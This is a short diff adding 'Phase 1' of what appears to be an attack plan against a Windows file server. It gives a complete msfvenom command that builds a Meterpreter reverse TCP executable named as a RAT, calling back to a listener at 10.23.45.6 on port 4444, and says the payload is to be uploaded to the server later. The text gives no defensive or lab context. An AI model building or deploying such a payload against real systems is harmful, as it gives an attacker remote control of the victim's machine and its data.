@@ -1,0 +1,6 @@
+**Phase 1: Generate custom RAT for Windows file server**  
+Using `msfvenom` to craft a Meterpreter reverse TCP payload. This payload will be uploaded later to the file server.
+
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.23.45.6 LPORT=4444 -f exe -o /tmp/vigil_rat.exe
+```
